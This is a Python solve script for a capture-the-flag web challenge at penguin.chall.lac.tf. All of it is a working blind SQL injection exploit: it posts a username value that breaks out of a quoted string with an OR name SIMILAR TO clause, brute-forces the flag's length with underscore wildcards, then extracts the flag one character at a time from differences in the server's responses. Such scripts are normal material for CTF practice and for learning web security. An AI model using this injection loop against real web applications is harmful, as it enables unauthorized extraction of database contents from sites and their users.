#!/usr/bin/env python3
import requests
import string

url = "http://penguin.chall.lac.tf"
alphabet = string.digits + string.ascii_lowercase + "{}_"
flag = "lactf_"
payload = "username=%27+OR+name+SIMILAR+TO+%27"

if __name__ == "__main__":
    s = requests.Session()
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    length = 1
    while True:
        payload2 = payload + flag + ("_" * length) + '}'
        print("Testing length:", length, end='\r')
        response = s.post(url + '/submit', data=payload2, headers=headers)
        if "We found a" in response.text:
            print("\n")
            print("Found length:", length)
            break
        length += 1

    flag_data = bytearray("_" * length, 'utf-8')
    for i in range(length):
        for c in alphabet:
            flag_data[i] = ord(c)
            flag_payload = flag + flag_data.decode('utf-8') + '}'
            payload2 = payload + flag_payload
            print("Testing:", flag_payload, end='\r')
            response = s.post(url + '/submit', data=payload2, headers=headers)
            if "We found a" in response.text:
                break

    print("\n")
    print("Flag:", 'lactf{' + flag_data.decode('utf-8') + '}')
